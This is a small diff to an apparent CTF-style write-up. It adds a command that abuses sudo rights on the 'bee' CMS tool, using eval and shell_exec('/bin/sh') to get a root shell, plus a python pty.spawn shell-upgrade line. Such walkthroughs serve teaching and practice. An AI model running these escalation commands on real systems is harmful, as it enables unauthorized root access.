@@ -105,4 +105,9 @@ These give a **full view of the site structure, roles, views, and content types*
 
 
 
-`   sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('/bin/sh');"   `
+sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('/bin/sh');"
+
+
+````bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
